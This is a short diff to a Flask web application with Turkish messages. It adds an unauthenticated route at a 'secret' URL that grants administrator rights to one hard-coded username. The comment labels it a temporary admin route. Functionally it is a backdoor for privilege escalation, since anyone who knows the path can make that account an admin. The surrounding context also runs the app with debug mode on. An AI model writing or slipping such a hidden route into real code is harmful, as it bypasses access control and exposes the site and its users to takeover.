@@ -2662,5 +2662,17 @@ def logout():
     flash('Oturum kapatıldı.', 'info')
     return redirect(url_for('login'))
 
+# ---------------------------------------------------------
+# GEÇİCİ ADMİN YAPMA ROTASI
+# ---------------------------------------------------------
+@app.route('/make-me-admin-secret-123')
+def make_me_admin():
+    u = User.query.filter(User.username.ilike('MatematikVSFen')).first()
+    if u:
+        u.is_admin = True
+        db.session.commit()
+        return f"Tebrikler! {u.username} başarıyla ADMIN yapıldı."
+    return "Kullanıcı bulunamadı!", 404
+
 if __name__ == '__main__':
     app.run(debug=True)
